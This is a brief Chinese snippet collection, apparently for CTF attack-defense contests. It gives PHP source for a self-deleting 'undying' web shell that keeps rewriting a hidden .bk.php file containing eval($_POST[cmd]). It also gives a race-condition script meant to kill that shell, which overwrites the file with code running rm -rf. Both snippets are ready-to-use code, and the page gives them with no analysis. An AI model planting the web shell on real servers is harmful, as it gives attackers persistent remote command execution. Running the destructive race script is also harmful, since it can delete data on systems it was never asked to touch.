# 不死马
```php
<?php
set_time_limit(0);
ignore_user_abort(1); #1表示，忽略与客户端断开连接，继续执行脚本
unlink(__FILE__); #执行完后删除自身
while (1) {
$content = '<?php @eval($_POST[cmd]);?>';
file_put_contents(".bk.php", $content);
usleep(10000); #停一会
}
?>
```
# 条件竞争删除不死马
```php
<?php
set_time_limit(0);
ignore_user_abort(1); #1表示，忽略与客户端断开连接，继续执行脚本
unlink(__FILE__); #执行完后删除自身
while (1) {
$content = "<?php eval(system('rm -rf ./bk.php'););?>";#自行根据不死马名称进行调整
file_put_contents(".bk.php", $content);#自行根据不死马名称进行调整
usleep(1000); #一定要比不死马的时间短
}
?>
```